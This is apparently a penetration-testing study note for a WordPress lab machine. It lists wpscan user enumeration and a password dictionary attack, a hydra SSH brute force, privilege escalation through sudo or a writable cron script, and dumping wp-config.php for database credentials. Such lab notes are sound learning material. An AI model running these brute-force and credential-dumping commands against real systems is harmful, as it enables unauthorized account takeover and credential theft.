Use *wpscan* to:
- Find the version of Wordpress and plugins in use
- List their known vulnerabilities
- Enumerate Wordpress users
	- `# wpscan --url http://192.168.4.3/backup_wordpress/ --enumerate u > wpsan_users.log 2>&1`
- Perform a dictionary to find Wordpress users' passwords
	- `# wpscan --url http://192.168.4.3/backup_wordpress --wordlist /root/tools/WORDLISTS/SecLists/Passwords/Common-Credentials/10k-most-common.txt --username john`
- Know how to test for Wordpress user enumeration manually
	- http://<domain>/path-to-wordpress/wp-login.php
	- try "admin", "test", "random"...
- When doing a dictionary attack, always try different dictionaries like `SecLists/Passwords/Common-Credentials/10k-most-common.txt` & `/usr/share/wordlists/rockyou.txt`

- Go from Wordpress GUI access to an OS shell 
- Before bruteforcing to find the SSH password of a user, always check that password authentication is allowed for that user (otherwise huge waste of time)
```console
# ssh anne@192.168.4.3
anne@192.168.4.3's password: 
# ssh doomguy@192.168.4.3
doomguy@192.168.4.3: Permission denied (publickey).
```
- SSH password bruteforce
	- `# hydra -l anne -P /usr/share/wordlists/rockyou.txt  192.168.4.3 ssh`
- Simplest method for privilege escalation on a Linux server: `sudo su`
- Other method for privilege escalation:
	- List cron jobs

	- Find out that runs a world-writable script with root privileges


- After gaining access to a Wordpress siteâ€™s source code, always dump the file wp-config.php to get the MySQL username & password.
```console
cat wp-config.php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp');

/** MySQL database username */
define('DB_USER', 'john@localhost');

/** MySQL database password */
define('DB_PASSWORD', 'thiscannotbeit');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```
- Tool to automate information gathering post exploitation: LinEnum.sh


